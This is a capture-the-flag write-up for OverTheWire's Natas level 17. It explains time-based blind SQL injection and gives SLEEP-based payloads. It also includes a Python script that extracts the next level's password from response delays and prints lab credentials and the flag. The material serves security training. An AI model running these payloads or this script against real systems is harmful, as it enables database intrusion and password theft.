# Natas Level 17 Writeup (natas17) – OverTheWire

## Overview

This level focuses on exploiting a **time-based blind SQL injection** vulnerability.  
The goal is to find the password for the next level.

## Observation

When we open the page, we see an input field:

> **"Please enter a username"**

Unlike the previous level, the page shows **no output indicating True or False**.


There is also a link to view the source code:

```
index-source.html
```

## Finding the Password

### Using Browser & BurpSuite
1. Open the source code.
2. It shows the `PHP` logic used:
    ```php
    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }
    ```
    No output is returned, completely blind.

3. Confirm SQL Injection:
    ```
    natas18" AND SLEEP(5)#
    ```
    There is no Response.
4. The password can be extracted using time-based conditions, similar to the previous level.
    - Payload Used: 
        ```
        natas18" AND IF(password LIKE BINARY \"a%\", sleep(5), 1)#
        ```

#### Proof
```text
Password of natas 18 is: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

### Using Python

```python
import requests, string

target = 'http://natas17.natas.labs.overthewire.org'
char = string.ascii_letters + string.digits
pw = ''

session = requests.Session()
session.auth = ('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')

# # check delay time for every character 
# print(char)
# for c in char:
#     query = f'natas18" AND IF(password LIKE BINARY \"{c}%\", sleep(60), 1)#'
#     r = session.get(target, params={'username': query})
#     delay = r.elapsed.total_seconds()  # time taken between request and response
#     print(f"Delay for {c}: {delay}")

sleep_time = 5  # Server will pause for 5 second if password is True

while len(pw) < 32:
    for c in char:
        query = f'natas18" AND IF(password LIKE BINARY \"{pw + c}%\", sleep({sleep_time}), 1)#'
        r = session.get(target, params={'username': query})
        delay = r.elapsed.total_seconds()
        if delay >= sleep_time: # check server will paused or not
            pw += c
            print(f'Password Like {pw}', end='\r')
            break
print(f'Password of natas 18 is: {pw}')
```

## Vulnerability

User input is directly used in an SQL query without sanitization, allowing time-based blind SQL injection.

## Flag
`6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`